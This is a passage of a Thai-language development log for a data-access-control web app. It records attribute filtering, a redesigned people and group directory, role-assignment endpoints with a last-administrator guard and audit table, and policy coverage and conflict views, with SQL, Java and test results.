data policy ไม่ได้พูดถึงฐานข้อมูล มันพูดถึง**สิ่งที่ถูกปิดไว้จาก table ที่คนเข้าถึงได้อยู่แล้ว** — และ `EyeOff` แบกความหมายนี้อยู่แล้วบนผลลัพธ์หน้า Query

#### 2. 🐛 scrollbar ในรางซ้ายตอน zoom 100% — **วัดก่อน ไม่เดา**

```
12 ลิงก์ × 44px + 11 ช่อง × 2px + 12px บน + 24px ล่าง ≈ 586px
+ footer copyright ≈ 83px                              ≈ 669px
พื้นที่จริงบนจอ laptop                                  ≈ 680px
```
เกินไปไม่กี่ px → ได้ scrollbar **เต็มความสูงที่ thumb ก็เต็มความสูง** = ตัวควบคุมที่เลื่อนอะไรไม่ได้ บนลิสต์ที่เห็นครบอยู่แล้ว

สาเหตุ: ทั้งคอลัมน์เป็นกล่อง scroll เดียว → บรรทัด copyright **นับรวมเข้าไปในความสูง**ด้วย

แก้ที่ [AppShell.tsx](frontend/app/src/layout/AppShell.tsx): `<nav>` เป็น `flex-col overflow-hidden`, ให้ **`<ul>` เท่านั้นที่ scroll** (`min-h-0 flex-1 overflow-y-auto`), footer เปลี่ยนจาก `mt-auto` เป็น `shrink-0` อยู่นอกกล่อง scroll
→ จอสูงพอ = ไม่มี scrollbar เลย · จอเตี้ยจริง = bar โผล่เฉพาะตรงลิสต์ ซึ่งเป็นส่วนเดียวที่มีที่ให้ไป

---

### U. Filter ตาม attribute ในหน้า People & attributes

> ผู้ใช้สั่งไว้ตั้งแต่รอบก่อน — *"People & attributes / อยากให้สามารถ Filter ตาม attribute ได้"* — รอบนี้ทำครบทั้งสามชั้น

#### สิ่งที่ได้

| ชั้น | ของใหม่ |
|---|---|
| SQL | `PrincipalQuery.AttributeFilter(key, value)` + `attributeClause(i)` — หนึ่งเงื่อนไข = หนึ่ง `EXISTS` ต่อท้าย WHERE |
| REST | `GET /api/v1/principals?attr=department=FINANCE&attr=clearance` — `attr` ซ้ำได้ เขียนได้ทั้ง `key` และ `key=value` |
| API client | `fetchPrincipals({ attributes: [{key, value?}] })` |
| UI | ตัวเลือก key + value + ปุ่ม Add filter · ชิปของเงื่อนไขที่เปิดอยู่ (กด × ถอดได้ / Clear ล้างทั้งหมด) · **กดชื่อ key หรือค่าในการ์ด "Attributes in use" เพื่อกรองได้ทันที** |

#### สามเรื่องที่ตัดสินใจโดยอ่านจาก engine ก่อน ไม่ได้เดา

**1. เงื่อนไขหลายข้อ = AND ไม่ใช่ OR**
`subjectRule.attributes` ในฝั่ง engine เป็น AND list อยู่แล้ว → directory ที่ OR กันจะตอบคนละคำถามกับที่คนเขียน rule ถามอยู่
ผลลัพธ์ที่ขึ้นบนจอจึงอ่านได้ตรงๆ ว่า **"subject rule ที่ใส่ attribute ชุดนี้จะ match คนกลุ่มนี้"**

**2. `EXISTS` ไม่ใช่ `JOIN`** — สองเหตุผลที่เปลี่ยนคำตอบจริง
- attribute เป็น multi-value: คนที่ถือทั้ง `clearance=L1` และ `L2` ต้อง match เงื่อนไข `L2` โดย**ไม่โผล่ซ้ำสองแถว**
- เงื่อนไขหลายข้อ join กันจะกลายเป็น cross product ที่นับซ้ำ

**3. ⚠️ ไม่ไล่ตาม group membership — เพราะ engine ก็ไม่ไล่**
อ่าน [PrincipalLoader.java](backend/dac-service/src/main/java/com/mfec/dac/policy/PrincipalLoader.java) ก่อนเขียน filter: attribute ถูกโหลดจาก `principal_attribute WHERE principal_id = <ตัวเอง>` เท่านั้น ส่วน group/team มาจาก `memberships()` คนละทางกัน
→ ถ้า directory ใจดีเอา attribute ของ group มาแจกให้สมาชิก **จะโชว์คนที่ engine ไม่มีทาง match** ซึ่งคือ bug ที่คนจะเชื่อหน้าจอมากกว่าเชื่อ engine

#### รายละเอียดที่ดูเล็กแต่เลือกไว้แล้ว

- `key=` (ไม่มีค่า) อ่านเป็น "มี key นี้" ไม่ใช่ "ค่าเท่ากับสตริงว่าง" — อีกทางหนึ่งจะ match ศูนย์คนแบบเงียบๆ ซึ่งหน้าตาเหมือนคำตอบ "ไม่มีใครถือ attribute นี้" พอดี
- `attr` ที่อ่านไม่ออกถูกข้าม ไม่ตอบ 400 — filter คือวิธีมอง ไม่ใช่ form ที่ต้อง validate
- เงื่อนไขซ้ำถูกยุบเหลือข้อเดียว (`AND` กับตัวเองได้คำตอบเดิม แต่ query ยาวขึ้นเปล่าๆ)
- เพดาน **10 เงื่อนไขต่อ URL** — กัน URL เดียวประกอบ join ไม่จำกัด
- เมื่อผลลัพธ์ว่างและมี filter อยู่ ข้อความจะไม่ใช่ "Nobody matches that" เฉยๆ แต่บอกว่า *rule แบบนี้จะ match ไม่มีใคร = deny ทุกคน* ซึ่งเป็นความผิดพลาดที่มองไม่เห็นที่สุดถ้าไปเจอตอน policy active แล้ว

#### เทสต์

- `AttributeFilterTest` — **12 เทสต์ / 2 nested class** (`One` 6 · `Many` 6) เจาะที่การ parse เพราะนั่นคือจุดที่ filter เพี้ยนแบบไม่มีใครจับได้
- `PrincipalsPage.test.tsx` — **5 เทสต์** (กด key = ทั้ง key · กดค่า = ปักค่า · กดซ้ำไม่เพิ่มซ้ำ · ถอดออกได้ · ข้อความตอน match ไม่มีใคร)
- dac-service **62 เทสต์** · backend รวม **341** · frontend **11 suites / 40 tests**

---

### V. หน้า People & attributes — รื้อใหม่ + กดเข้าไปดูสมาชิกใน group ได้

> ผู้ใช้สั่ง — *"ปรับหน้านี้หน่อยไม่สวย ใช้งานยาก / แล้วจะกดเข้าไปดูว่าใน group มีใครบ้างยังไงอะ / หรือ group/user ควรอยู่ในหน้า people เหมือนกัน หรือยังไงดี แบบให้สิทธิ ระดับ app / ควรจะแบ่ง Role ยังไงดี"*

#### V.1 🐛 บั๊กที่อยู่บนจอมาตลอด — ทุกคนขึ้นว่า "0 groups"

`PRINCIPAL_COLUMNS` มี subquery เดียวชื่อ `member_count` ที่นับ **คนที่อยู่ข้างใน principal นี้** แล้วแถวของ user เอาเลขนั้นไปเขียนว่า "X groups"
→ user ทุกคน `member_count = 0` เสมอ (คนไม่มีสมาชิก) **จอเลยบอกว่าไม่มีใครอยู่ group ไหนเลย** ทั้งที่ `group_member` มีข้อมูลครบ

แก้ที่ SQL ไม่ใช่ที่ UI — เพิ่มคอลัมน์ที่สอง เพราะมันคือ **คนละคำถาม** และมีแค่ทางเดียวที่ไม่เป็นศูนย์ต่อหนึ่งแถว:

```sql
(SELECT count(*) FROM group_member gm WHERE gm.group_id  = p.id) AS member_count,  -- ใน group นี้มีใคร
(SELECT count(*) FROM group_member gg WHERE gg.member_id = p.id) AS group_count,   -- คนนี้อยู่ group ไหน
```
(เปลี่ยนชื่อ alias เป็น `gm`/`gg` ไปด้วย ของเดิม `g` ชนกับ `related()` ที่ join `group_member g`)

#### V.2 🐛 `detail()` มีโอกาส 500 — `findOne()` บน key ที่ไม่ unique

`principal` unique ที่ **`(source, username)`** ไม่ใช่ `username` → Entra มี group ชื่อ `Finance` และ OM team ชื่อ `Finance` พร้อมกันได้ แล้ว `.findOne()` จะโยน
แก้: `GET /v1/principals/{key}` รับได้ทั้ง **UUID และ username** (เทียบด้วย `UUID_FORM` regex ไม่ต้องยิง DB สองรอบ) — directory ลิงก์ด้วย **id** เสมอ ส่วน username เหลือไว้ให้พิมพ์ URL เองได้ และเติม `ORDER BY p.source` + `findFirst()`

#### V.3 หน้าใหม่ `/principals/:id` — `PrincipalDetailPage.tsx`

API `{principal, attributes, groups, members}` **มีข้อมูลครบมาตั้งแต่ต้น ขาดแค่หน้าจอ**

| ส่วน | เนื้อหา |
|---|---|
| Members (เฉพาะ group) | ตารางคนใน group กดต่อเข้าไปได้อีก · group ว่าง = บอกตรงๆ ว่า rule ที่อ้าง group นี้ = deny ทุกคน |
| Attributes | key / value / synced from — **หนึ่งแถวต่อหนึ่งค่า** (multi-value) |
| ⚠️ กล่องเตือนบน group ที่มี attribute | *attribute ของ group สมาชิก**ไม่**ได้รับสืบทอด* — engine (`PrincipalLoader`) อ่าน `principal_attribute` ของตัวคนเอง ส่วน group มาจาก `memberships()` คนละทาง → ถ้าจะให้ถึงสมาชิกต้องอ้าง **ชื่อ group** ใน subject rule ไม่ใช่ attribute ของ group |
| Member of | group ที่คนนี้สังกัด + จำนวนสมาชิกของแต่ละ group |
| Platform role | badge + ลิงก์ไป `/settings/roles` พร้อมประโยคกำกับว่า **นี่คือสิทธิ์ทำอะไรกับ ARAK ไม่ใช่สิทธิ์เห็นข้อมูล** |

#### V.4 หน้า directory รื้อใหม่ตามแบบ Catalog

| เดิม | ใหม่ |
|---|---|
| การ์ด "Attributes in use" อ้วนเต็มความกว้าง กินทั้งหน้าจอแรก | **รางซ้าย sticky `lg:w-64`** แบบเดียวกับ Catalog — หนึ่งกลุ่มต่อหนึ่ง key พับได้ |
| แถวเป็น flex ไม่ตรงคอลัมน์ | **`<table>` จริง** — Name · Kind · Source · Attributes · Membership · Platform role |
| ตัวเลือก key/value + ปุ่ม Add filter | ติ๊กในรางได้เลย · **มีจำนวนคนต่อ "ค่า"** (`FINANCE · 3`) ไม่ใช่ต่อ key อย่างเดียว |
| filter อยู่ใน state | **อยู่ใน URL** (`?q=&type=&attr=department=FINANCE`) → ส่งลิงก์ให้คนอื่นเปิดเห็นชุดเดียวกัน |
| ไม่มีทางกดเข้าไปดู group | ชื่อ = ลิงก์ · **จำนวนสมาชิกของ group = ลิงก์** (คนกดตรงนั้นก่อนเสมอ) |

`attributeKeys()` ฝั่ง backend เขียนใหม่ให้คืน `AttributeValue(value, principals)` — query แรกใช้ `row_number() OVER (PARTITION BY attr_key, source)` ตัดจำนวนค่าต่อ key, query ที่สอง aggregate ระดับ key แล้วเอามา merge กัน
เหตุผลที่ต้องมีเลขต่อค่า: *key ที่มีคนถือ 40 คน ไม่ได้บอกอะไรเลยเกี่ยวกับ rule ที่กำลังจะเขียน แต่ `clearance=L3 · 1` บอกทันที*

> รางนับ "คน" แบบ **max ข้าม source ไม่ใช่ sum** — คนเดียวถือ key เดียวกันจากสอง sync ได้ ถ้าบวกกันจะรายงานคนมากกว่าที่มีอยู่จริง

#### V.5 คำตอบเรื่อง IA: People vs Settings → Roles — **แยกกันสองหน้า ไม่รวม**

คำถามคือ *"group/user ควรอยู่ในหน้า people เหมือนกันไหม"* — คำตอบคือ **อยู่หน้าเดียวกันอยู่แล้วและถูกแล้ว** แต่ที่ต้องแยกคือ *สิทธิ์*:

| | **People & attributes** (`/principals`) | **Settings → Roles** (`/settings/roles`) |
|---|---|---|
| ตอบคำถาม | "ใครมีอยู่บ้าง ถือ attribute อะไร อยู่ group ไหน" | "ใครกดปุ่มอะไรใน ARAK ได้" |
| เจ้าของข้อมูล | **Entra / OpenMetadata** → read-only ตลอดไป (sync ทับ) | **ARAK เอง** (`app_role_assignment`) → เขียนได้ |
| ใช้ตอน | เขียน subject rule | onboard คนเข้ามาดูแลระบบ |
| ระดับ | ข้อมูลใน database | ตัวแอป |

**เหตุผลที่ห้ามรวม:** สองหน้านี้เขียนได้ไม่เท่ากัน หน้าหนึ่ง sync ทับทุกคืน อีกหน้าคือของเรา ถ้ารวมปุ่ม "Assign role" ลงในแถว directory คนจะเข้าใจว่า attribute ก็แก้ได้ด้วย — แล้วพรุ่งนี้ sync ก็ลบทิ้ง
**เชื่อมกันด้วยลิงก์แทน** — มุมขวาบนของ People เขียนว่า *Platform roles are assigned in Settings → Roles* และการ์ด Platform role ในหน้า detail ลิงก์กลับไปหน้าเดียวกัน

**ส่วน Role 5 ตัวที่มีอยู่ ไม่ต้องแบ่งใหม่** — `AppRolesPage.tsx` ประกาศไว้ครบและทุก capability มี citation ชี้ไปบรรทัดใน `PolicyResource.java` ที่บังคับจริง:

| Role | สรุปสั้น |
|---|---|
| `PLATFORM_ADMIN` | ตั้งค่า connection / sync / role — **ไม่ได้แปลว่าเห็นข้อมูล** |
| `POLICY_AUTHOR` | เขียน/แก้ policy ทุกชั้น แต่ **อนุมัติ grant เองไม่ได้** (separation of duty FR-2.6) |
| `DATA_OWNER` | เขียน local policy + ให้ grant **เฉพาะใน scope ที่ตัวเองเป็น owner ใน OM** |
| `AUDITOR` | อ่าน audit / decision log ได้หมด เขียนอะไรไม่ได้เลย |
| `REQUESTER` | default ของทุกคน — เห็น catalog + สิทธิ์ของตัวเอง |

⚠️ **ยังไม่มีหน้าจอ assign จริง** — `app_role_assignment` (พร้อม `scope_fqn`, `granted_by`, `granted_at`) มีตั้งแต่ Flyway V2 แต่ยังไม่มี write API งานนี้ **ต้องลงที่ `/settings/roles` ไม่ใช่ที่ People** ตามเส้นแบ่งข้างบน

#### เทสต์

- dac-service **62 เทสต์** (failures 0 / errors 0) · backend รวม **341**
- frontend **12 suites / 47 tests** — `PrincipalsPage.test.tsx` **8 เทสต์** (เพิ่ม: รางโชว์จำนวนคนต่อค่า · group ลิงก์ด้วยจำนวนสมาชิก · **แถว user ต้องนับ group ไม่ใช่ member** = กันบั๊ก V.1 กลับมา) · `PrincipalDetailPage.test.tsx` **4 เทสต์ (ใหม่)**

---

### W. เพิ่ม local user + assign App role ได้จาก UI แล้ว (ปิดครึ่งหนึ่งของช่องว่างข้อ 2)

> ผู้ใช้สั่ง — *"เอาเลย ให้สามารถเพิ่ม local user + App role ได้"*
> สองข้อที่ตกลงกันไว้เป็นลายลักษณ์อักษรก่อนลงมือ และทำครบทั้งคู่: **กัน admin ถอด `PLATFORM_ADMIN` ของตัวเองคนสุดท้ายทิ้ง** และ **`scope_fqn` ของ `DATA_OWNER` ต้องเลือกจาก catalog ไม่ใช่พิมพ์**

#### W.1 Migration `V10__identity_admin.sql` — ปิดบั๊กเงียบสองตัวที่ schema เดิมมีอยู่

ทั้งสองตัวอยู่มาตั้งแต่ V2 และ **มองจากข้างนอกเหมือนทำงานปกติ** ซึ่งเป็นเหตุผลว่าทำไมต้องปิดก่อนเปิดให้เขียนผ่าน UI:

| บั๊ก | ทำไมไม่มีใครเห็น | ที่แก้ |
|---|---|---|
| grant ระดับ global ซ้ำได้ไม่จำกัด | UNIQUE ของ V2 ครอบ `(principal_id, app_role, scope_fqn)` แต่ **Postgres ถือว่า NULL ไม่ชนกับ NULL** → grant ที่ `scope_fqn IS NULL` (คือ role ทุกตัวยกเว้น DATA_OWNER) `ON CONFLICT DO NOTHING` เลยไม่เคยทำงาน | `DELETE` ตัวซ้ำ แล้ว `CREATE UNIQUE INDEX app_role_assignment_global_idx ON app_role_assignment (principal_id, app_role) WHERE scope_fqn IS NULL` |
| local username ต่างกันแค่ตัวพิมพ์ | `principal` unique ที่ `(source, username)` → สร้าง `Admin` คู่กับ `admin` ได้ แล้ว `findLocalAccount().findOne()` ตอน login จะโยน | `CREATE UNIQUE INDEX principal_local_username_ci_idx ON principal (lower(username)) WHERE source = 'local' AND principal_type <> 'GROUP'` |

บวกตาราง **`audit_identity_change`** (append-only, ปิดข้อ 4 ของช่องว่างเฉพาะส่วน identity): `occurred_at, actor, action, target_principal_id, target_username, target_source, app_role, scope_fqn, reason, client_ip inet`
`action` มี CHECK — `CREATE_PRINCIPAL | ENABLE_PRINCIPAL | DISABLE_PRINCIPAL | SET_PASSWORD | GRANT_ROLE | REVOKE_ROLE`
**ไม่มี FK ไป `principal`** โดยตั้งใจ — log ต้องรอดแม้ principal ถูกลบ (พิสูจน์แล้วตอนเก็บกวาด probe account: ลบ principal ทิ้ง audit ยังอยู่ครบ)

#### W.2 `IdentityAdminStore` — กฎที่ปฏิเสธก่อนถึง database

| กฎ | ค่า |
|---|---|
| username | `[A-Za-z0-9][A-Za-z0-9._@-]{1,63}` |
| password | 10–200 ตัว และ **ห้ามเท่ากับ username** (เทียบแบบไม่สนตัวพิมพ์) |
| display name | **บังคับ** ≤ 200 |
| ชนิดที่สร้างได้ | `USER` / `SERVICE` เท่านั้น — **`GROUP` ปฏิเสธ** เพราะ group มาจาก sync |
| `DATA_OWNER` | **ต้องมี scope** |
| role อื่นทุกตัว | **ต้องไม่มี scope** — `AuthenticatedUser` รวม scope ของทุก assignment เข้าลิสต์เดียว scope ที่ติดมากับ role ระดับแพลตฟอร์มจึงอ่านเป็นอำนาจที่ไม่ได้ตั้งใจให้ |
| ลำดับการตรวจ | **ตรวจ role ก่อนสร้าง account** ไม่ใช่หลัง — ไม่งั้นได้ account มาครึ่งเดียวโดยไม่มีใครรู้ |

**Last-administrator guard** — กันทั้งสองทางที่ทำให้ล็อกตัวเองออก (`revoke` และ `disable`) นับเฉพาะคนที่ `enabled` และ **ไม่นับคนที่กำลังจะถูกเปลี่ยน**:

```java
private static void guardLastAdmin(Handle handle, UUID principalId, String message) {
  if (holdsGlobalAdmin(handle, principalId) && countGlobalAdmins(handle, principalId) == 0) {
    throw new IdentityConflictException(message);
  }
}
```

#### W.3 Endpoint ใหม่หกตัว — `PrincipalResource`, `@Secured({"PLATFORM_ADMIN"})` ทุกตัว

| Method | Path | คืน |
|---|---|---|
| `GET` | `/v1/principals/roles` | `{grants, appRoles, globalAdminCount}` |
| `POST` | `/v1/principals` | `201` + `PrincipalDetail` |
| `POST` | `/v1/principals/{id}/roles` | `{changed}` |
| `DELETE` | `/v1/principals/{id}/roles?role=&scope=&reason=` | `{changed}` |
| `POST` | `/v1/principals/{id}/enabled` | `PrincipalDetail` |
| `POST` | `/v1/principals/{id}/password` | `204` |

`clientIp` มาจาก `request.getRemoteAddr()` **ไม่ใช่ `X-Forwarded-For`** — กฎเดียวกับ `QueryResource` ห้ามเปลี่ยน
`InvalidPrincipalException → 400` · `IdentityConflictException → 409`
`inet` ย้ายออกจาก `QueryService` ไปเป็น `com.mfec.dac.audit.ClientAddress.normalise()` แล้ว (`QueryService.inet` เหลือ delegate บรรทัดเดียวเพื่อให้ `QueryServiceInetTest` ยังคุมของเดิมอยู่)

#### W.4 หน้าจอ — `/settings/roles` เขียนได้แล้ว

- **`Assignments`** ตาราง grant ทั้งหมด (Who · Role · Scope · Granted · Withdraw)
  แถวที่เป็น **`PLATFORM_ADMIN` ระดับ global คนสุดท้าย** ขึ้นคำว่า *Last administrator* แทนปุ่ม — *กันไว้ที่หน้าจอก่อนกด ไม่ใช่โยน 409 ใส่หน้าหลังกด*
- **`GrantForm`** — `PrincipalPicker` + เลือก role + (ถ้า `DATA_OWNER`) `ScopePicker` + เหตุผล
- **`AccountForm`** — username · display name · kind (`USER`/`SERVICE`) · email · first password · role เริ่มต้น
- **`pickers.tsx`** — `PrincipalPicker` / `ScopePicker` เป็น **search-and-pick ไม่ใช่ free text** เหตุผลเขียนไว้ใน doc comment: *username ที่พิมพ์ผิดคือ 404 ที่คนเห็น แต่ FQN ที่พิมพ์ผิดตัวเดียวคือ DATA_OWNER grant ที่ไม่ match อะไรเลย เงียบๆ และดูถูกต้องในทุกหน้าที่ list มันออกมา*
- **ไม่มี route guard** ที่ `/settings/roles` (ทั้งแอปยังไม่มี) → หน้านี้ **ถาม `hasRole('PLATFORM_ADMIN')` แล้ว `enabled: isAdmin` ปิด query ทิ้งไปเลย** ไม่ใช่ปล่อยให้ยิงแล้วเจอ 403
- ⚠️ **token ค้าง** — role ถูกอบเข้า JWT ตอน login (TTL 3600s) แต่ `/auth/me` อ่าน `app_role_assignment` สดทุกครั้ง → **console เห็นทันที แต่ authorization จริงเปลี่ยนตอน sign in รอบหน้า** เขียนประโยคนี้ไว้บนหัวตาราง ไม่ได้ซ่อน

#### W.5 ทดสอบกับของจริงบน 8080 — เจอบั๊กที่เทสต์ไม่เจอ

ยิงครบทั้งหกตัวด้วย token ของ `admin` จริง:

| เคส | ผล |
|---|---|
| สร้าง account + role เริ่มต้น | `201` |
| สร้างชื่อเดิมต่างตัวพิมพ์ | **`409`** (index ของ W.1 ทำงาน) |
| password สั้น | `400` *A password is between 10 and 200 characters* |
| `DATA_OWNER` + scope | `{"changed":true}` |
| `DATA_OWNER` ไม่มี scope | `400` *A data owner owns something specific: give the scope it applies to* |
| grant ซ้ำ | `{"changed":false}` — **ไม่ซ้ำแถว** |
| ถอด `PLATFORM_ADMIN` ของ admin คนสุดท้าย | **`409`** |
| disable admin คนสุดท้าย | **`409`** |
| ไม่มี token | `401` |

`audit_identity_change` เก็บครบ 10 แถวพร้อม `reason` และ `client_ip` = `::1`

🐛 **บั๊กที่เจอเพราะยิงของจริง:** server บังคับ display name แต่ `AccountForm.ready` ไม่ได้เช็ค → ปุ่ม **Create เปิดให้กดทั้งที่ตอบได้แค่ 400**
เทสต์ทั้ง 5 ตัวของหน้านี้ผ่านหมด เพราะไม่มีตัวไหนกด Create — *unit test ที่ mock API ทิ้งไม่มีทางเจอ validation ที่อยู่คนละฝั่ง* แก้แล้วทั้งสองฝั่ง (`ready` เช็ค `displayName.trim().length >= 2` และ hint เขียนว่า Required)

#### W.6 🗑️ เอา **Sources** ออกจากรางซ้าย (ผู้ใช้สั่ง)

> *"Source นี้ อยู่ใน Setting อยู่แล้ว ไม่ต้องแสดงที่ tab ซ้าย"*

ลบ entry ออกจาก `NAV_SECTIONS` เท่านั้น — **route `/sources` ยังอยู่** และยังเข้าถึงได้สามทาง: Settings → Data sources (การ์ด), เมนู **+ Create → Register a source**, และเมนู account
ถูกแล้วที่ไม่ลบ route: มันคือหน้า setup ไม่ใช่งานประจำวัน ซึ่งเป็นเหตุผลเดียวกับที่ไม่ควรอยู่บนรางระดับบนสุด (เขียนเป็น comment คาไว้ตรงที่ลบ กัน "เพิ่มกลับมาสิ" รอบหน้า)

#### W.7 🐛 "Membership of 1 group" กดไม่ได้ (ผู้ใช้ชี้)

> *"Membership of 1 group จากที่แสดงใน user / ทำไมกดไปดู group นั้นไม่ได้"*

แถว **group** ลิงก์ด้วยจำนวนสมาชิกมาตั้งแต่รอบ V แต่แถว **user** เป็น text เปล่า — ซึ่งเป็นสิ่งที่แย่ที่สุดที่ตัวเลขตัวหนึ่งจะบอกได้: *มี group อยู่ คนนี้อยู่ในนั้น แต่ไม่มีทางรู้ว่า group ไหน*

เหตุผลที่แก้ที่ฝั่ง API ไม่ใช่แค่ทำให้ตัวเลขเป็นลิงก์: list endpoint มีแต่ `groupCount` ไม่มี id ของ group เลยลิงก์ตรงไม่ได้ → เพิ่มคอลัมน์ลง `PRINCIPAL_COLUMNS`

```sql
COALESCE((SELECT json_agg(json_build_object('id', named.id, 'name', named.name))
          FROM (SELECT g.id, COALESCE(NULLIF(g.display_name,''), g.username) AS name
                  FROM group_member gn JOIN principal g ON g.id = gn.group_id
                 WHERE gn.member_id = p.id
                 ORDER BY 2 LIMIT 5) named)::text, '[]') AS groups,
```

- **`json` ไม่ใช่ string ที่คั่นด้วย comma** — display name มีอะไรอยู่ข้างในก็ได้ รวมถึงตัวคั่นที่ตอนนั้นดูปลอดภัย
- **`LIMIT 5`** — `groupCount` ตอบ "กี่ group" อยู่แล้ว ลิสต์นี้มีไว้ตอบ "group ไหน" ในเคสปกติ (1–2 group) คนที่อยู่ 50 group ไม่ควรทำให้ทุกแถวของ directory กลายเป็นกำแพง
- mapper แปลง JSON แบบ **ไม่โยน** — คอลัมน์เดียวอ่านไม่ออกไม่ควรทำให้ทั้ง directory หาย

UI: ผู้ใช้ ≤ 2 group → **ชิปชื่อ group กดเข้าไปได้ตรงๆ** · มากกว่านั้น → `N groups` เป็นลิงก์ไปหน้าตัวเอง (ซึ่งการ์ด *Member of* list ครบอยู่แล้ว) · group ยังลิงก์ด้วย `N members` เหมือนเดิม
ตรวจกับข้อมูลจริงในเครื่องแล้ว — `analyst_a` / `analyst_b` / `steward_c` คืน `[{"id":"51296ea9-…","name":"Finance"}]` ครบทั้งสามคน

#### เทสต์

- dac-service **69 เทสต์** *(ตัวเลขนี้นับผิด — วัดใหม่ 2026-09-22 ได้ **56**; ส่วนต่างคือ nested class ของ IT ที่รั่วเข้าเฟส unit ดู What Didn't Work)* (ใหม่ 7 — `IdentityAdminStoreTest` ที่สร้างบน `Jdbi` = `null` โดยตั้งใจ: **NullPointerException ในไฟล์นั้นแปลว่า input เดินทางไปถึง connection ก่อนที่จะมีใครตรวจ** ซึ่งคือ regression ที่ไฟล์นี้มีไว้จับ)
- `IdentityAdminStoreIT` **15 เทสต์** (Testcontainers, `-Pintegration verify` exit 0) — Creating 4 · Roles 3 · **LastAdministrator 4** · SyncedPrincipals 2 · Audit 2
- frontend **13 suites / 54 tests** — `AppRolesPage.test.tsx` **5 ตัว (ใหม่)** · `PrincipalsPage.test.tsx` **10 ตัว** (เพิ่ม 2: ชื่อ group ของคนต้องกดเข้าไปได้ · คนที่อยู่หลาย group ต้อง fallback เป็นตัวเลขที่ยังกดได้)

---

### X. หน้า Policy แยก "อ่าน" ออกจาก "แก้" + ตอบสองคำถามที่กลับด้านกัน (ปิด FR-3.1.5)

> ผู้ใช้สั่ง — *"ใน Policies ต้องกด Edit ถึงจะไปหน้าแก้ไขได้ ถ้าไม่ Edit แค่ให้เห็น Configure แบบ สรุป ออกแบบหน้าจอให้ดี ง่าย และดูได้ว่ามี Table Column ไหน Apply กับ Policy นั้นบ้าง มี Policy ไหน ที่ COnflict กับ policy นี้บ้าง / ใน ทางกลับกัน ก็ต้องดูได้ว่า Table นี้ มี Subscription Policy และ Data policy ไหน apply อยู่บ้าง"*

รอบนี้เป็นสองคำถามที่เป็นด้านกลับของกันและกัน และเดิมระบบตอบไม่ได้ทั้งคู่:

| ถามจากฝั่ง policy | ถามจากฝั่ง asset |
|---|---|
| policy นี้ลงไปที่ **table/column ไหนจริงๆ** | table นี้มี **policy อะไรคุมอยู่** |
| มี policy ไหน **ชนกับ**ตัวนี้ | แบ่งเป็น Subscription / Data |

**ความต่างที่เป็นหัวใจ:** `selector` คือ *คำกล่าวอ้าง* ส่วน `policy_binding` คือ *ผลจริง* — สองอย่างนี้ต่างกันทุกครั้งที่ estate ขยับหลัง resolve ครั้งล่าสุด และนั่นคือสิ่งที่คนกำลังจะกด Activate ต้องเห็น

#### X.1 Backend — `policy/PolicyOverview.java` (ใหม่, 492 บรรทัด)

คลาสเดียว ตอบสามคำถาม อ่าน `policy_binding` เป็นแหล่งความจริงทั้งหมด:

| method | ตอบว่า | endpoint |
|---|---|---|
| `coverage(policyId)` | policy นี้ลงที่ไหนบ้าง — `tableCount` / `columnCount` แยกกัน + `sample` + `truncated` + `resolvedAt` | `GET /v1/policies/{id}/bindings` |
| `overlaps(policyId, document, environment)` | policy อื่นที่ bind target เดียวกัน + **คำตัดสินว่าเจอกันแล้วเกิดอะไร** | `GET /v1/policies/{id}/conflicts` |
| `applied(fqn, activePolicies)` | table นี้โดน policy อะไร + **column ไหนของ table นี้ที่แต่ละตัวลงไปถึง** | `GET /v1/policies/for-asset/{fqn}` |

**`sample` ถูก cap ที่ 200 (`SAMPLE_LIMIT`) แต่ `tableCount` / `columnCount` นับจาก SQL ทั้งหมดไม่ cap** — เป็นกติกาเดียวกับที่ผู้ใช้สั่งไว้ตอนหน้า Query (*"ต้องทำให้เห็นครบสิ ในอนาคตอาจจะมี Row เยอะ"*): ตัวเลขต้องจริงเสมอ ตัดได้แค่รายการที่โชว์ และหน้าจอต้องบอกว่าตัดแล้ว

**`relate()` — คำตัดสินว่า overlap หนึ่งๆ แปลว่าอะไร** (เรียงตาม `RELATION_ORDER`, แรงสุดขึ้นก่อน):

| relation | เกิดเมื่อ | ความหมาย |
|---|---|---|
| `BLOCKED_BY` | ตัวเราเป็น SUBSCRIPTION ALLOW เจอ DENY | **ตัวนี้ตายบน target ที่ชนกัน** — deny ชนะเสมอ |
| `BLOCKS` | ตัวเราเป็น DENY เจอ ALLOW | ตัวโน้นตาย |
| `MASK_OVERLAP` | DATA ทั้งคู่ และตัวเราแตะ column | ลงคอลัมน์เดียวกัน = เข้มกว่าชนะ อีกตัวไม่มีผลที่มองเห็น |
| `NARROWS` | SUBSCRIPTION ALLOW ทั้งคู่ / DATA ที่เป็น row filter | **ต้องผ่านทุกชั้น** ไม่ใช่ผ่านตัวใดตัวหนึ่ง — เป็นข้อที่คนเข้าใจผิดบ่อยที่สุด |
| `COMPOSES` | คนละ type / DENY ทั้งคู่ | อยู่ด้วยกันได้ ไม่มีใครทับใคร |

`CANNOT_LOOSEN` มีอยู่ใน `RELATION_ORDER` และใน union ฝั่ง TS แต่ **`relate()` ไม่เคยคืนค่านี้** — เรื่อง "ใครมีสิทธิ์แก้" ถูกตอบด้วย `overrideNote` ต่างหาก (ดู X.4) จดไว้เป็นช่องว่างข้อ 7

#### X.2 แก้ `affecting` ที่ default ผิด environment — บั๊กเงียบที่อันตรายที่สุดของรอบนี้

`PolicyResource.affecting` default `environment` เป็น `"dev"` แต่ `DecisionService.DEFAULT_ENVIRONMENT` เป็น `"prod"` → **หน้าจอ "policy ที่มีผลกับ asset นี้" ตอบคนละ environment กับที่ engine ตัดสินจริง** และเพราะ policy ที่เขียนใหม่ส่วนใหญ่ถูกเก็บเป็น `dev` หน้าจอจะ *ดูเหมือนถูก* แล้วไปหลุดตอน enforce

แก้เป็น helper ตัวเดียวที่ทุก endpoint ใช้ร่วมกัน:

```java
private static String environmentOr(String environment) {
  return environment == null || environment.isBlank()
      ? DecisionService.DEFAULT_ENVIRONMENT
      : environment;
}
```

ฝั่ง TS `fetchPoliciesAffecting` / `fetchPoliciesForAsset` ก็ default เป็น `'prod'` ตามกัน → **ปิดช่องว่างข้อ 3**

> ⚠️ ที่ยังไม่ปิด: **หน้า builder ยัง default `environment: 'dev'` ตอนสร้าง policy** ในขณะที่ engine enforce `prod` → policy ที่เขียนด้วยค่า default ล้วนๆ จะไม่มีวันถูก enforce เลย จดเป็นช่องว่างข้อ 8

#### X.3 `/policies/:id` = อ่านอย่างเดียว · `/policies/:id/edit` = builder

